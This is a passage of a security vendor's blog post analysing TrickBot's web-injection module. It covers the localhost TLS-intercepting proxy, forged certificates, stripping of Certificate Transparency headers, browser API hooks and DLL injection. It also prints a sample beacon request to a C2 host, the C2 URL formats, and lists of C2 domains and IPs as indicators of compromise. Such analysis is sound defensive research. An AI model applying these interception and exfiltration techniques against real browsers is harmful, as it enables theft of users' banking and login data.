<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><title>Deep Dive into Trickbot's Web Injection - Kryptos Logic</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=title content="Deep Dive into Trickbot's Web Injection"><meta name=description content="Overview TrickBot, a modular trojan, has been active in the malware scene since 2016. It is famously known for having a variety of modules in its attack toolkit, some of which are quite recent and some being actively developed. This brings us to its web injection module, injectDLL, that has been around since the malware was first discovered. The core purpose of the module still remains the same, which is injecting scripts into websites to exfiltrate information."><meta name=twitter:card content="summary_large_image"><meta name=twitter:site content="@kryptoslogic"><meta name=twitter:title content="Deep Dive into Trickbot's Web Injection"><meta name=twitter:description content="Overview TrickBot, a modular trojan, has been active in the malware scene since 2016. It is famously known for having a variety of modules in its attack toolkit, some of which are quite recent and some being actively developed. This brings us to its web injection module, injectDLL, that has been around since the malware was first discovered. The core purpose of the module still remains the same, which is injecting scripts into websites to exfiltrate information."><meta property="og:url" content="https://www.kryptoslogic.com/blog/2022/01/deep-dive-into-trickbots-web-injection/"><meta property="og:title" content="Deep Dive into Trickbot's Web Injection"><meta property="og:description" content="Overview TrickBot, a modular trojan, has been active in the malware scene since 2016. It is famously known for having a variety of modules in its attack toolkit, some of which are quite recent and some being actively developed. This brings us to its web injection module, injectDLL, that has been around since the malware was first discovered. The core purpose of the module still remains the same, which is injecting scripts into websites to exfiltrate information."><meta property="og:image" content="https://www.kryptoslogic.com/blog/2022/01/deep-dive-into-trickbots-web-injection/images/header_hu5f5fb63bd0b7b208e2cfc0a1f1bb9b1d_99766_800x418_fit_q75_box.jpg"><meta name=twitter:image content="https://www.kryptoslogic.com/blog/2022/01/deep-dive-into-trickbots-web-injection/images/header_hu5f5fb63bd0b7b208e2cfc0a1f1bb9b1d_99766_800x418_fit_q75_box.jpg"><link rel=icon href=https://www.kryptoslogic.com/favicon.png><link rel=stylesheet href=/css/style.min.80c1a32b0bec38fbdc5370e02ca3f5e64b5f44111ffd26fa3419f2f4f89fe914.css></head><body class=page><div class=wrapper><header class="kl-navbar kl-navbar--fixed kl-navbar-expand-lg"><div class=container><a class=kl-navbar-logo href=https://www.kryptoslogic.com/><img alt="Kryptos Logic" src=https://www.kryptoslogic.com/images/logo.svg></a>
<button class=kl-navbar-toggler type=button data-toggle=collapse data-target=#kl-navbar-dropdown aria-controls=kl-navbar-dropdown aria-expanded=false aria-label=Menu>
<span class=kl-navbar-toggler-icon></span><span class=kl-navbar-toggler-text>Menu</span></button><div class="collapse kl-navbar-collapse" id=kl-navbar-dropdown><ul class="kl-navbar-nav ml-auto"><li class="kl-nav-item kl-nav-item--products dropdown"><a class="kl-nav-link dropdown-toggle" href=# role=button data-toggle=dropdown>Products</a><div class=dropdown-menu><a class=dropdown-item href=/products/telltale/>Telltale</a></div></li><li class="kl-nav-item kl-nav-item--blog"><a class=kl-nav-link href=/blog/>Blog</a></li><li class="kl-nav-item kl-nav-item--jobs"><a class=kl-nav-link href=/jobs/>Jobs</a></li><li class="kl-nav-item kl-nav-item--contact us"><a class=kl-nav-link href=/contact/>Contact Us</a></li></ul></div></div></header><div class=main><div class="container pt-6"><div class="row justify-content-start"><div class=col-lg-9><div class=blog-post><header class=blog-post-header><h2 class=blog-post-title><a href=https://www.kryptoslogic.com/blog/2022/01/deep-dive-into-trickbots-web-injection/>Deep Dive into Trickbot's Web Injection</a></h2><span class=blog-post-author>Authored by:
<a target=_blank href=https://twitter.com/kryptoslogic>Kryptos Logic Vantage Team</a>
on</span>
<time class=blog-post-date datetime="2022-01-24 10:15:00 +0000 UTC">Monday, January 24, 2022<br>Tags:
<a href=https://www.kryptoslogic.com/blog/tag/trickbot>trickbot</a></time></header><div class=blog-post-content><p><h1 id=overview>Overview</h1><p>TrickBot, a modular trojan, has been active in the malware scene since 2016. It is famously known for having a variety of modules in its attack toolkit, some of which are quite recent and some being actively developed. This brings us to its web injection module, <code>injectDLL</code>, that has been around since the malware was first discovered. The core purpose of the module still remains the same, which is injecting scripts into websites to exfiltrate information. However, there have been some recent additions to the module, especially since the introduction of its newer webinject config <code>winj</code><sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>.</p><p>One technique that is worth noting is the module&rsquo;s ability to circumvent Certificate Transparency checks - an open framework that was introduced to detect malicious TLS certificates<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>. Some of the other changes are techniques seen used by malware families such as the creation of a localhost proxy<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup> and the utilization of a multistage JavaScript web injection<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>.</p><p>Herein, we explore these latest developments and uncover how the module works.</p><hr><h1 id=webinject-module-setup>Webinject Module Setup</h1><p>The module is loaded by executing its <code>Start</code> and <code>Control</code> export functions.</p><p>The <code>Start</code> export is responsible for orchestrating the webinject process. When the export is executed, the module checks if it is able to utilize Windows' CryptoAPI in the victim machine for its TLS communication routine. Failing this check, the module terminates. The export then makes modifications to certain browser files and the system&rsquo;s registry (elaborated <a href=#internet-explorer>here</a> and <a href=#firefox>here</a>). Additionally, several threads are launched by the export, each playing a different role in the web injection routine. What each thread does is elaborated upon <a href=#threads>here</a>.</p><p>The <code>Control</code> export handles parsing of the config files. It saves a pointer to the parsed config in the module, in order for the threads to be able to access it. Currently the known config names for TrickBot&rsquo;s webinject module are <code>sinj</code>, <code>dinj</code>, <code>dpost</code> and <code>winj</code>. At the time of analyzing the webinject module, we were unable to acquire a <code>sinj</code> or <code>dinj</code> config. Hence this blog will focus more on the <code>winj</code> and <code>dpost</code> configs.</p><hr><h1 id=threads>Threads</h1><p>The module launches several threads, each playing a different role. A diagrammatic view of the threads launched by the module is shown in <em><strong>Image 1</strong></em>.</p><figure><a href=images/Threads.png data-toggle=lightbox data-title="1. Webinject Module's Threads"><img src=images/Threads.png loading=lazy></a><figcaption><h4>1. Webinject Module's Threads</h4></figcaption></figure><p>Below is a summary on what the threads accomplish. We group them to summarize them better before we dive in depth into each thread&rsquo;s functionality:</p><ul><li>The Proxy, Session, DPOST and ZeusPing threads have a network role. The Proxy thread sets up the proxy and for every new connection made to the proxy, the Session thread gets launched. The Session thread handles communication between the browser and website. The DPOST thread sends data to C2s listed in the <code>dpost</code> config and the ZeusPing thread makes requests to C2s listed in the <code>winj</code> config.</li><li>The Browser and Pipe threads inject into browsers and set up communication with them, respectively.</li><li>Finally, the threads CallBack and Ping relay events back to the main bot.</li></ul><h2 id=proxy-thread><strong>Proxy Thread</strong></h2><p>The proxy thread creates a socket that binds to <code>127.0.0.1:15733</code>. It listens for incoming connections to the socket that would be made by the injected browser module.</p><p>The thread then creates a session thread for every new connection.</p><h2 id=session-thread><strong>Session Thread</strong></h2><p>A session thread is created for every new socket connection made to the localhost proxy from the browser. This thread handles communication with the browser and to the website that the browser is trying to connect to. The thread is able to process SOCKS communication if the browser uses one. It intercepts TLS traffic by modifying certificates and accordingly modifies the requests and responses. Finally, the thread is responsible for injecting the malicious JavaScript provided by the <code>winj</code> config if it finds a target URL.</p><p>Every thread is passed a structure <code>tk__session</code>(<a href=#appendix>see Appendix</a>) as a parameter (enabling the thread to keep track of information related to that specific connection).</p><p>The sequence diagram below shows the flow of events that takes place with each session.</p><figure><a href=images/proxies4.png data-toggle=lightbox data-title="2. Sequence diagram of Session events"><img src=images/proxies4.png loading=lazy></a><figcaption><h4>2. Sequence diagram of Session events</h4></figcaption></figure><p><strong>1. Handshake from browser</strong></p><p>The initial request processed by the Session thread is a modified SOCKS4 protocol sent by the injected browser module. The modified SOCKS4 protocol is the first request received before handling the actual requests initiated by the browser. This request is sent from the APIs <code>Connect</code> and <code>ConnectEx</code> that are hooked by the browser module. The hooking process is explained <a href=#injected-browser-module>here</a>.</p><p>The data sent contains information about the website the browser is attempting to connect to, including information about the browser itself. Below is the format of that information:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++>
<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>tk__modified_SOCKS4</span>{
    BYTE SOCKS_Version;        <span style=color:#75715e>// Version 4
</span><span style=color:#75715e></span>    BYTE CommandCode;          <span style=color:#75715e>// set to 0x01 - TCP/IP stream connection
</span><span style=color:#75715e></span>    WORD Port;
    DWORD IP;                  <span style=color:#75715e>// big-endian
</span><span style=color:#75715e></span>    <span style=color:#75715e>// This part of the structure would normally have the user ID string, if it were SOCKS4
</span><span style=color:#75715e></span>    <span style=color:#75715e>// Since this is a modified SOCKS4, the module replaces it with information of the browser
</span><span style=color:#75715e></span>    BYTE browserType;          <span style=color:#75715e>// 0x01 - InternetExplorer
</span><span style=color:#75715e></span>                               <span style=color:#75715e>// 0x02 - Firefox
</span><span style=color:#75715e></span>                               <span style=color:#75715e>// 0x03 - Chrome
</span><span style=color:#75715e></span>                               <span style=color:#75715e>// 0x04 - MicrosoftEdge
</span><span style=color:#75715e></span>    DWORD browserPID;
};
</code></pre></div><p>If the thread has parsed the request with no errors, it sends an 8 byte response <code>005a000000000000</code>, signifying <code>Request Granted</code><sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>.</p><p>One observation is the option of parsing a SOCKS5 protocol if it was sent as the initial handshake request. However, we have not come across a browser module that implements SOCKS5 as the initial handshake request.</p><p>After a successful handshake request is established between the Session thread and the browser module, the thread proceeds to handle the rest of the actual request.</p><p><strong>2. Browser uses SOCKS</strong></p><p>The module checks if the browser uses a SOCKS proxy, by inspecting the original request for the SOCKS4 or SOCKS5 protocols.</p><p>If the browser uses SOCKS, the thread forwards every browser (client) request to the SOCKS server and every SOCKS server response back to the browser. It does this until it detects a request in the SOCKS protocol that matches either a TLS protocol or an HTTP request.</p><p><strong>3. Modifying browser requests</strong></p><p>Before forwarding any browser requests to the website, the thread modifies the header <code>Accept-Encoding</code> if it is present. The value set is <code>gzip;q=1,deflate,br;q=0</code>. This header normally gets set by the browser to indicate the type of content encoding that it can accept<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>. The thread overwrites the value of the header to implement one method of encoding, so it is able to view the received contents and inject scripts if needed.</p><p><strong>4. Modifying/Injecting website responses</strong></p><p>First off, the thread checks the response headers of every website and modifies certain headers if they are present. The headers it checks for are used for enforcing Certificate Transparency, which is an open framework for auditing and monitoring TLS certificates<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>. The headers<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup><sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup><sup id=fnref:9><a href=#fn:9 class=footnote-ref role=doc-noteref>9</a></sup> are described in the table below:</p><table class="table table-bordered"><thead><tr><th style=text-align:left>Header</th><th style=text-align:left>Modified Header</th><th style=text-align:left>Purpose for Modification</th></tr></thead><tbody><tr><td style=text-align:left><code>Expect-CT</code></td><td style=text-align:left><code>X-pect-XX</code></td><td style=text-align:left>To prevent sites from enforcing Certificate Transparency (see <em><strong>Image 3</strong></em>).</td></tr><tr><td style=text-align:left><code>Public-Key-Pins</code></td><td style=text-align:left><code>X-blic-Key-Pins</code></td><td style=text-align:left>To prevent a server from sending public key hashes to the browser to check for fraudulent certificates.</td></tr><tr><td style=text-align:left><code>Public-Key-Pins-Report-Only</code></td><td style=text-align:left><code>X-blic-Key-Pins-Report-Only</code></td><td style=text-align:left>Same as above</td></tr></tbody></table><figure><a href=images/x-pect-xx.png data-toggle=lightbox data-title="3. Header as seen in Firefox"><img src=images/x-pect-xx.png loading=lazy></a><figcaption><h4>3. Header as seen in Firefox</h4></figcaption></figure><p>Finally, if the header <code>Content-Type</code> is present in the response and is either of type <code>text/plain</code> or <code>text/html</code>, then the thread checks if the website matches any of the target URLs in the config list. If there is a match, the thread injects the JavaScript obtained from the <code>winj</code> config accordingly.</p><h3 id=making-tls-connections><strong>Making TLS connections</strong></h3><p>The session thread makes TLS connections with the browser and with the website using the Windows <code>SSPI</code> (<code>Security Support Provider Interface</code>) model<sup id=fnref:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup>. To keep track of the certificate contexts used in creating secure connections, it saves the information in a struct <code>tk__cert_context</code>(<a href=#appendix>see Appendix</a>).</p><p><strong>Connections with the website</strong></p><p>The thread creates a self signed certificate, using CN as <code>localhost</code>, that is used as the client&rsquo;s side certificate context when establishing connections to a website. This client certificate context is not added to any certificate store and is instead saved in the structure <code>tk__cert_context</code>(<a href=#appendix>see Appendix</a>) used by the Session thread.</p><p><strong>Connections with the browser</strong></p><p>Before forwarding the requests made by the browser to the website, the session thread first attempts to connect to the website directly. In doing so, it acquires the website&rsquo;s certificate context. It does this to not only use the original certificate to communicate with the website, but to also create a modified version of the website&rsquo;s certificate to communicate with the browser. The modifications to the certificate are done according to which browser is being used. It does this to prevent the browsers from detecting suspiciously crafted certificates as well as to prevent them from doing any Certificate Transparency checks.</p><p>First, a copy of the website&rsquo;s certificate is saved in the struct <code>tk__cert_context</code>(<a href=#appendix>see Appendix</a>). Then, the website&rsquo;s certificate is deleted from the certificate stores (<code>Root</code>, <code>CA</code>, <code>My</code> and <code>Temp</code>), if it existed before.</p><p>Second, the thread attempts to create its own CA certificate matching the issuer name in the website&rsquo;s certificate. It does this so it can create its own modified website certificate that is signed by a CA it controls. Retaining the encoded certificate&rsquo;s issuer name, the thread uses it when creating a new self-signed CA certificate. The certificate is built with the following extensions (see <em><strong>Image 4</strong></em>):</p><ul><li><code>extendedKeyUsage</code>: <code>TLS Web Server Authentication</code></li><li><code>keyUsage</code>: <code>Digital Signature, Key Encipherment, Data Encipherment</code><br>The algorithm used is <code>sha256WithRSAEncryption</code> and 10 years is added to the expiry.</li></ul><p>In addition to the above, if the browser is Firefox, then the thread deletes the original CA certificate from Firefox&rsquo;s certificate database and imports its self-signed CA certificate instead. It does this by leveraging the APIs of the browser&rsquo;s DLL <code>nss3.dll</code>: <code>NSS_Initialize</code>, <code>CERT_GetDefaultCertDB</code>, <code>PK11_GetInternalKeySlot</code>, <code>CERT_DecodeCertFromPackage</code>, <code>CERT_FindCertByDERCert</code>, <code>PK11_ImportCert</code>, <code>CERT_ChangeCertTrust</code>, <code>CERT_DestroyCertificate</code>, <code>PK11_FreeSlot</code>, <code>NSS_Shutdown</code>, <code>CERT_FindCertByNicknameOrEmailAddrCX</code>, <code>SEC_DeletePermCertificate</code>, <code>PK11_FindCertFromNickname</code>, <code>PK11_DeleteTokenCertAndKey</code> and <code>PORT_GetError</code>.</p><figure><a href=images/CA-cert.png data-toggle=lightbox data-title="4. Comparison of the CA certificate"><img src=images/CA-cert.png loading=lazy></a><figcaption><h4>4. Comparison of the CA certificate</h4></figcaption></figure><p>Third, a new public/key pair is generated and then signed by the self-signed CA certificate.</p><p>Finally, when building the new website certificate, the thread retains certain information from the original website&rsquo;s certificate and modifies other values. The information retained are the version number, issuer unique ID, subject unique ID, <code>NotAfter</code> timestamp, the subject name and the subject public key information. Information about the <code>NotBefore</code> timestamp is modified, if the browser it is communicating with is <code>Chrome</code> (see <em><strong>Image 5</strong></em>). If the <code>NotBefore</code> timestamp is greater than than year 2017, the year is set to 2017. And if the month is set to October or above, it is changed to September. As for the Certificate&rsquo;s serial number, if the communicating browser is Firefox, a random serial number is generated instead.</p><figure><a href=images/server-cert.png data-toggle=lightbox data-title="5. Modified Certificates"><img src=images/server-cert.png loading=lazy></a><figcaption><h4>5. Modified Certificates</h4></figcaption></figure><h2 id=dpost-thread><strong>DPOST Thread</strong></h2><p>This thread is created by the session thread, to gather data from every POST request made by the browser and send it to the <code>dpost</code> C2s. These C2s are provided by the <code>dpost</code> config.</p><p>The URI created to the <code>dpost</code> C2 is as follows:</p><pre><code>https://&lt;c2&gt;:&lt;port&gt;/&lt;gtag&gt;/&lt;botid&gt;/&lt;command&gt;/
</code></pre><p>Below is a table of the commands and their meaning. In the sample analyzed, we only observed the use of command <code>60</code> (a known command for sending captured traffic<sup id=fnref:11><a href=#fn:11 class=footnote-ref role=doc-noteref>11</a></sup>), whereas the other commands do not appear to be used by the module.</p><table class="table table-bordered"><thead><tr><th style=text-align:center>Command</th><th style=text-align:left>Information Captured</th><th style=text-align:center>Used by Module</th></tr></thead><tbody><tr><td style=text-align:center><code>60</code></td><td style=text-align:left>Base64 encoded POST data, keys, POST URL</td><td style=text-align:center>Yes</td></tr><tr><td style=text-align:center><code>81</code></td><td style=text-align:left>POST data, POST URL</td><td style=text-align:center>No</td></tr><tr><td style=text-align:center><code>82</code></td><td style=text-align:left>same as command <code>81</code></td><td style=text-align:center>No</td></tr><tr><td style=text-align:center><code>83</code></td><td style=text-align:left>POST data, bill info, card info</td><td style=text-align:center>No</td></tr></tbody></table><h2 id=browser-thread><strong>Browser Thread</strong></h2><p>The browser thread monitors the running processes to check for browsers to inject the browser module into. The thread uses the <code>Reflective DLL injection</code> technique<sup id=fnref:12><a href=#fn:12 class=footnote-ref role=doc-noteref>12</a></sup> to load the module into the browser.</p><p>Currently, the thread targets browsers such as Internet Explorer, Firefox, Chrome and Microsoft Edge. It makes sure to skip the Tor browser since the browser runs under the process name <code>firefox.exe</code>. The thread also checks for browsers such as Amigo and Yandex, but doesn&rsquo;t proceed with injecting into them.</p><p><strong>Firefox</strong></p><p>For injecting into Firefox, before proceeding with the reflective loader, the thread first overwrites the address of <code>BaseThreadInitThunk</code> in the Firefox process. Firefox is known to hook certain Windows APIs and in this case Firefox hooks <code>BaseThreadInitThunk</code><sup id=fnref:13><a href=#fn:13 class=footnote-ref role=doc-noteref>13</a></sup> to check for any suspicious remote threads injected into the browser.</p><p><strong>Chrome</strong></p><p>Injection into the Chrome process undergoes a few steps:</p><ol><li>First off, it skips Chrome processes that are running with the parameters <code>network.mojom.NetworkService</code>.</li><li>When a Chrome process is found, the thread saves the access token of the browser and its original parameters before terminating it.</li><li>The thread then restarts Chrome with the original parameters along with <code>--disable-http2 --use-spdy=off --disable-quic --enable-logging --log-level=0</code>.</li></ol><h2 id=zeusping-thread><strong>ZeusPing Thread</strong></h2><p>The ZeusPing thread makes a GET request to a C2 url. This url is provided via the <code>winj</code> config under the <code>depend</code> field. The config is described <a href=#winj-webinjects>here</a>.</p><p>At the time of researching the webinject module, we were not able to retrieve a <code>winj</code> config having a <code>depend</code> field.</p><h2 id=callback-thread><strong>CallBack Thread</strong></h2><p>The callback thread sends messages back to the bot regarding certain events. The thread loops until there is a message queued up by the Module to send to the main bot. When a message is available, it is passed as a parameter to the main bot&rsquo;s <code>CallBack</code> function.</p><h2 id=ping-thread><strong>Ping Thread</strong></h2><p>The ping thread sends the current timestamp message back to the bot. This message is read by the <code>CallBack</code> thread. The timestamp message is sent every 2-5 minutes as long as the threads are running.</p><h2 id=pipe-thread><strong>Pipe Thread</strong></h2><p>The pipe thread gets created by the browser thread if it has detected a browser process to inject the browser module into. This thread communicates with the browser module via a pipe object. The thread creates a pipe object with a name format similar to the module&rsquo;s previous variants<sup id=fnref:14><a href=#fn:14 class=footnote-ref role=doc-noteref>14</a></sup>. The format is <code>\\.\pipe\pidplacesomepipe</code> with the browser&rsquo;s <code>PID</code> written over <code>pidplacesomepipe</code>.</p><p>The thread keeps track of each pipe name created, only if the string <code>XiiZ1q7ubnvnLf4LP6wNJo97xE</code> appears within the browser module. However, at the time of analysis, we were unable to acquire a webinject module that had a browser module which communicates with the pipe.</p><hr><h1 id=browser-modifications>Browser Modifications</h1><h2 id=injected-browser-module><strong>Injected Browser Module</strong></h2><p>The browser module is responsible for setting up the initial handshake with the malicious proxy and ensuring no TLS certificate errors. If it observes the browser is being debugged, it stops redirecting to the proxy and communication resumes as normal. To carry out these activities, it hooks onto the APIs <code>Connect</code>, <code>ConnectEx</code>, <code>WSAIoctl</code>, <code>CertGetCertificateChain</code> and <code>CertVerifyCertificateChainPolicy</code>.</p><ol><li><code>Connect</code></li></ol><p>The <code>Connect</code> hook ignores browser connections made to <code>0.0.0.0</code> and any connections made on port <code>9229</code> (Chrome&rsquo;s dev-tools connects to port <code>9229</code> for debugging<sup id=fnref:15><a href=#fn:15 class=footnote-ref role=doc-noteref>15</a></sup>). It establishes the initial handshake to the malicious proxy.</p><ol start=2><li><code>ConnectEx</code></li></ol><p>If the browser type is MicrosoftEdge or Firefox, the module hooks the <code>ConnectEx</code> API. The address of the API is obtained by making a call to the <code>WSAIoctl</code> API with the <code>SIO_GET_EXTENSION_FUNCTION_POINTER</code> opcode specified<sup id=fnref:16><a href=#fn:16 class=footnote-ref role=doc-noteref>16</a></sup>. The <code>ConnectEx</code> hook ignores browser connections made to <code>127.0.0.1</code> or <code>0.0.0.0</code>. This hook also establishes the initial handshake to the malicious proxy.</p><ol start=3><li><code>WSAIoctl</code></li></ol><p>If the browser is Chrome or Internet Explorer, the module hooks the <code>WSAIoctl</code> API. This hook checks if the control opcode passed to the api is <code>SIO_GET_EXTENSION_FUNCTION_POINTER</code>. If it is not, the hook passes the arguments to the original <code>WSAIoctl</code>. Else if it is has the opcode <code>SIO_GET_EXTENSION_FUNCTION_POINTER</code> and there is a pointer in the parameter for the output buffer, then the hook passes the address of the <code>ConnectEx</code> hook function above to the output buffer.</p><ol start=4><li><code>CertGetCertificateChain</code></li></ol><p>The <code>CertGetCertificateChain</code> hook modifies the result of the chain context created. Any errors in the <code>TrustStatus</code> is removed and the status is set to:</p><ul><li><code>CERT_TRUST_HAS_EXACT_MATCH_ISSUER</code></li><li><code>CERT_TRUST_HAS_ISSUANCE_CHAIN_POLICY</code></li><li><code>CERT_TRUST_HAS_VALID_NAME_CONSTRAINTS</code><br>The same is implemented for every certificate chain in that context and the final element in each chain is additionally set to <code>CERT_TRUST_IS_SELF_SIGNED</code>.</li></ul><ol start=5><li><code>CertVerifyCertificateChainPolicy</code></li></ol><p>The <code>CertVerifyCertificateChainPolicy</code> hook removes the error status of this API&rsquo;s result.</p><h2 id=internet-explorer><strong>Internet Explorer</strong></h2><p>The module disables certain registry entries in the system to modify how Internet Explorer gets run and to assist the module in injecting JavaScript. These entries are:</p><ul><li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\EnableHTTP2</code> - This registry setting determines if Internet Explorer should use the HTTP/2 network protocol which allows for compression of HTTP data<sup id=fnref:17><a href=#fn:17 class=footnote-ref role=doc-noteref>17</a></sup>. Disabling this registry setting makes it easier for the module to carry out webinjection. It is a common technique that banking trojans employ<sup id=fnref:18><a href=#fn:18 class=footnote-ref role=doc-noteref>18</a></sup>.</li><li><code>Software\Microsoft\Internet Explorer\Main\TabProcGrowth</code> - This registry sets the rate at which Internet Explorer creates new tab processes<sup id=fnref:19><a href=#fn:19 class=footnote-ref role=doc-noteref>19</a></sup>. By disabling it, the tabs run in the same process<sup id=fnref:20><a href=#fn:20 class=footnote-ref role=doc-noteref>20</a></sup>, thus making it easier for the webinject module to inject the browser module.</li></ul><h2 id=firefox><strong>Firefox</strong></h2><p>The module modifies certain properties in Firefox&rsquo;s <code>pref.js</code> file. The following set of properties are set to false:</p><ul><li><code>browser.tabs.remote.autostart</code> - This property sets Firefox&rsquo;s multi-process implementation, which means disabling it has all tabs stay in the same process instead of a new process for each new tab.</li><li><code>browser.tabs.remote.autostart.2</code> - same as above</li><li><code>network.http.spdy.enabled.http2</code> - Disabling this property disables the use of the HTTP/2 network protocol.</li></ul><h1 id=winj-webinjects><code>winj</code> WebInjects</h1><p>The <code>winj</code> config follows the same format as Zeus&rsquo;s config<sup id=fnref:21><a href=#fn:21 class=footnote-ref role=doc-noteref>21</a></sup>, except for an additional parameter <code>depend</code>. This new field contains a C2 URL that the ZeusPing thread attempts to reference and make a request to. It is unclear what the intention of the request is; perhaps being a new feature yet to be implemented.</p><pre><code>set_url      - URL target with options  
depend       - Trickbot C2 to make a GET request to
data_before  - Inject data to add before content
data_after   - Inject data to add after content
data_inject  - Inject data
</code></pre><h2 id=functionality-on-the-webinjects><strong>Functionality on the webinjects</strong></h2><p>The injected JavaScript beacons out to a C2 decrypted within the script to download the final <code>jquery</code> file which steals information from the website.</p><p>Since the introduction of <code>winj</code> there have been updates to the config, especially to the list of URLs that are targeted. Previously, there were a small list of target URLs. Currently, that list has increased and in addition there is a single script that gets injected into any URL that matches the format <code>https://*/*</code>. This &ldquo;core&rdquo; script is necessary and is used in conjunction with the other injected scripts to download the final <code>jquery</code> payload.</p><p>The core script beacons to the C2 <code>s1[.]deadseaproductions[.]com</code> with information about the bot embedded in the headers. It relays information of the <code>%BOTID%</code> and the URL that is currently being browsed via the headers <code>X-Client-Id</code> and <code>X-Client-Origin</code> respectively.</p><pre><code>GET /api.js HTTP/1.1
Host: s1.deadseaproductions.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: en-CA,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip;q=1,deflate,br;q=0
X-Client-Origin: https://target-url/content/
X-Client-Id: %BOTID%
Origin: https://target-url
Connection: keep-alive
Referer: https://target-url
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
</code></pre><p>If the response received by the core script is status <code>200</code>, the script injects the response as a JavaScript script element into the webpage. During analysis, we were unable to receive a <code>200</code> status code and instead kept receiving a <code>204</code> status code.</p><p>In addition to the core script, if the URL matches a target URL in the config, then the secondary scripts are injected into the website. If the injected script has a script tag with class information, those scripts make further requests to a C2 decrypted from the script to obtain the final stage of the webinjects which is a jquery file.</p><p>In building the request URL, values from the class information in the script tag is used in addition to a string decrypted within the javascript. Those values are necessary for pulling down the final payload.</p><p>The GET request is of the following format:</p><pre><code>https://%C2%/%BOTID%/%decrypted-string%/%script-class-values%/%jquery-filename%
</code></pre><hr><h1 id=conclusion>Conclusion</h1><p>These new developments to the webinject module are just the start. In a short timeframe, we have seen changes added to the module and especially in the webinjects that are being delivered. Below are some IOCs we provide related to the analysis done on this module.</p><hr><h1 id=iocs>IOCs</h1><h2 id=c2s><strong>C2s</strong></h2><table class="table table-bordered"><thead><tr><th style=text-align:left>Origin Script</th><th style=text-align:left>C2 Domain</th><th style=text-align:center>Request</th><th style=text-align:left>URL Path</th><th style=text-align:left>File Requested</th></tr></thead><tbody><tr><td style=text-align:left>Core Script</td><td style=text-align:left><code>s1[.]deadseaproductions[.]com</code></td><td style=text-align:center>GET</td><td style=text-align:left></td><td style=text-align:left><code>api.js</code></td></tr><tr><td style=text-align:left>Secondary Script</td><td style=text-align:left><code>myca[.]adprimblox[.]fun</code></td><td style=text-align:center>GET</td><td style=text-align:left><code>/%BOTID%/%decrypted-string%/%script-class-values%/</code></td><td style=text-align:left><code>jquery-3.5.1.min.js</code></td></tr><tr><td style=text-align:left>Secondary Script</td><td style=text-align:left><code>seq[.]mediaimg23[.]monster</code></td><td style=text-align:center>GET</td><td style=text-align:left><code>/%BOTID%/%decrypted-string%/%script-class-values%/</code></td><td style=text-align:left><code>jquery-3.5.1.min.js</code></td></tr><tr><td style=text-align:left>Final jquery</td><td style=text-align:left><code>akama[.]pocanomics[.]com</code></td><td style=text-align:center>POST</td><td style=text-align:left></td><td style=text-align:left></td></tr></tbody></table><p><code>DPOST</code> C2s</p><pre><code>http://175[.]184[.]232[.]234:443
http://202[.]152[.]56[.]10:443
http://139[.]255[.]41[.]122:443
http://103[.]75[.]32[.]173:443
http://64[.]64[.]150[.]203:443
http://116[.]206[.]62[.]138:443
http://96[.]9[.]69[.]207:443
http://117[.]54[.]140[.]98:443
http://103[.]11[.]218[.]199:443
http://114[.]7[.]243[.]26:443
http://110[.]38[.]58[.]198:443
http://96[.]9[.]74[.]169:443
http://103[.]111[.]83[.]86:443
http://190[.]183[.]60[.]164:443
http://206[.]251[.]37[.]27:443
http://196[.]44[.]109[.]73:443
http://138[.]94[.]162[.]29:443
http://45[.]221[.]8[.]171:443
http://27[.]109[.]116[.]144:443
http://45[.]116[.]68[.]109:443
http://45[.]115[.]174[.]60:443
http://45[.]115[.]174[.]234:443
http://36[.]95[.]73[.]109:443
http://80[.]210[.]26[.]17:443
http://186[.]96[.]153[.]223:443
</code></pre><h2 id=samples><strong>Samples</strong></h2><table class="table table-bordered"><thead><tr><th style=text-align:center>SHA256</th><th style=text-align:center>Description</th></tr></thead><tbody><tr><td style=text-align:center><code>6a75c212b49093517e6c29dcb2644df57a931194cf5cbd58e39e649c4a2b84ba</code></td><td style=text-align:center>Webinject Module</td></tr></tbody></table><hr><h1 id=appendix>Appendix</h1><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>enum</span> <span style=color:#a6e22e>BROWSER_TYPE</span>{
    InternetExplorer,
    Firefox,
    Chrome,
    MicrosoftEdge,
    Other
};

<span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>enum</span> <span style=color:#a6e22e>HTTP_VERB</span>{
    GET,
    POST,
    PUT,
    DELETE,
    HEAD,
    CONNECT
};

<span style=color:#75715e>/*
</span><span style=color:#75715e>   Structure passed as parameter to each Session thread
</span><span style=color:#75715e>*/</span>
<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>tk__session</span>
{
  DWORD SessionID;
  sockaddr_in browserAddress;        <span style=color:#75715e>// Browser IP address
</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   Connections made to the proxy
</span><span style=color:#75715e></span>  sockaddr_in websiteAddress;        <span style=color:#75715e>// Website IP address
</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   Connections made to the website
